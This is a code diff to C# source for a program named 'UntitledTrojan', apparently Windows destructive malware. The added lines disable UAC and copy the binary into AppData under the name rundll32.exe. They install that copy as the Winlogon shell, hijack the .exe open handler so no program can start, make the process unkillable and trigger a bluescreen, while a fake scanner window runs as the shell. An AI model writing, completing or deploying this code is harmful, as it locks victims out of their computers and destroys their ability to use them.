@@ -2,6 +2,7 @@
 using System;
 using System.Collections.Generic;
 using System.Diagnostics;
+using System.IO;
 using System.Linq;
 using System.Runtime.InteropServices;
 using System.Threading.Tasks;
@@ -34,18 +35,27 @@ namespace UntitledTrojan
                 {
                     if (!debug)
                     {
-                        // Make sure that this process can't be killed
-                        MakeUnclosable();
-                        // Copy itself and set as shell
-                        FileHelper.CopyItself();
                         // Disable UAC
                         RegistryKey uac = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System", true);
-                        if (uac == null)
-                        {
-                            uac = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
-                        }
                         uac.SetValue("EnableLUA", 0);
-                        uac.Close();
+                        
+                        // Copy itself into some folder
+                        string path = $"C:\\Users\\{Environment.UserName}\\AppData\\Microsoft\\Windows\\";
+                        string rundll = "rundll32.exe";
+                        Directory.CreateDirectory(path);
+                        File.Copy(Application.ExecutablePath, path + rundll);
+
+                        // Set itself as a shell
+                        RegistryKey key1 = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon", true);
+                        key1.SetValue("Shell", path + rundll + " /s");
+
+                        // Anti-EXE
+                        RegistryKey key2 = Registry.ClassesRoot.OpenSubKey(@"exefile\shell\open\command", true);
+                        key2.SetValue("Default", $"msg \"{Environment.UserName}\" Do you think that you can do this?");
+
+                        // Make sure that this process can't be killed
+                        MakeUnclosable();
+
                         // Bluescreen
                         Crash();
                     }
@@ -58,11 +68,11 @@ namespace UntitledTrojan
             }
             else
             {
-                if (!debug) MakeUnclosable();
-                switch (args[1])
+                switch (args[0])
                 {
                     case "/s":
                         // This is shell one. Open fake scanner
+						if (!debug) MakeUnclosable();
                         main = new FakeScanner();
                         Application.Run(main);
                         break;
